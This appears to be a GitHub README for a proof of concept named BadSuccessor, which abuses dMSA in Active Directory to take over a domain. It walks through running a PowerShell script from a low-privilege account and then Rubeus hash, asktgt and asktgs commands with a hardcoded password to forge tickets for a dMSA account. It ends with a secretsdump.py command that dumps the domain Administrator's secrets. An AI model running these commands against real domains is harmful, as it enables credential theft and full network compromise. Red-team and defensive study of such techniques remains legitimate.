# BadSuccessor-PoC
Abusing dMSA for Domain Takeover in AD

## For the Exploit to work:
- Must have a low privileged account is the domain (inital - foothold).
- The low privileged account should have CreateChild access on some OU. (Refer [BadSuccessor](https://github.com/ibaiC/BadSuccessor) find command)

## Exploit Steps:
- Replace the fields enclosed with < > with appropriate values in .ps1 file and Rubeus Commands.
- Run the script once or just copy-paste the script on the PS shell on the low privileged account.
![](https://github.com/githubjerin/BadSuccessor-PoC/blob/main/assets/1.png)
- Next we need to use Rubeus:
    - Use Rubeus to get the aes256 key of PwnedMachine created by the script.
    `.\Rubeus.exe hash /user:PwnedMachine$ /password:NewP@ssw0rd /domain:<Domain - Ex: example.com>`
    ![](https://github.com/githubjerin/BadSuccessor-PoC/blob/main/assets/2.png)
    - Now use the below command to request TGT for PwnedMachine using the aes256 key obtained from the previous step.
    `.\Rubeus.exe asktgt /user:PwnedMachine$ /aes256:<aes256 key> /nowrap`
    ![](https://github.com/githubjerin/BadSuccessor-PoC/blob/main/assets/3.png)
    - Finally, get the service ticket for some account with the dMSA account.
    `.\Rubeus.exe asktgs /targetuser:pwned_dmsa$ /service:krbtgt/<Domain - Ex: example.com> /nowrap /dmsa /opsec /ticket:<Base64 TGT from previous step> `
    ![](https://github.com/githubjerin/BadSuccessor-PoC/blob/main/assets/4.png)
- Convert the ticket obtained from the previous step to a .ccache file using any base64 to ccache converter.
![](https://github.com/githubjerin/BadSuccessor-PoC/blob/main/assets/5.png)
- Now just dump the secrets using the ticket obtained from the previous step (Hint: Use Ligolo if Kerberos ports are not exposed also use faketime if necessary).
`secretsdump.py -k -no-pass <DC - Ex: DC01.example.com> -dc-ip 240.0.0.1 -target-ip 240.0.0.1 -just-dc-user Administrator`
![](https://github.com/githubjerin/BadSuccessor-PoC/blob/main/assets/6.png)
And voila, you have successfully taken over the domain using dMSA and BadSuccessor technique.